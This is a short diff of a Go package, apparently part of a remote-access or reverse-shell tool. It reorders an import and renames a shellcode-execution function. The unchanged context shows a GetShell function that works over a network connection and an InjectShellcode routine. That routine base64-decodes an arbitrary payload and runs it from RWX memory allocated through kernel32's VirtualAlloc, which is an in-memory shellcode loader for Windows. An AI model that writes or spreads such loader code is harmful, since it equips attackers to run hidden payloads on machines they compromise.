@@ -5,11 +5,11 @@ package remoteop
 import (
 	"encoding/base64"
 	"fmt"
+	"golang.org/x/sys/windows"
 	"io"
 	"log"
 	"net"
 	"os/exec"
-	"golang.org/x/sys/windows"
 	"unsafe"
 )
 
@@ -66,14 +66,14 @@ func GetShell(conn net.Conn) {
 func InjectShellcode(encShellcode string) {
 	if encShellcode != "" {
 		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
-			go ExecShellcode(shellcode)
+			go execShellcode(shellcode)
 		}
 	}
 }
 
 // ExecShellcode maps a memory page as RWX, copies the provided shellcode to it
 // and executes it via a syscall.Syscall call.
-func ExecShellcode(shellcode []byte) {
+func execShellcode(shellcode []byte) {
 	// Resolve kernell32.dll, and VirtualAlloc
 	kernel32 := windows.MustLoadDLL("kernel32.dll")
 	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
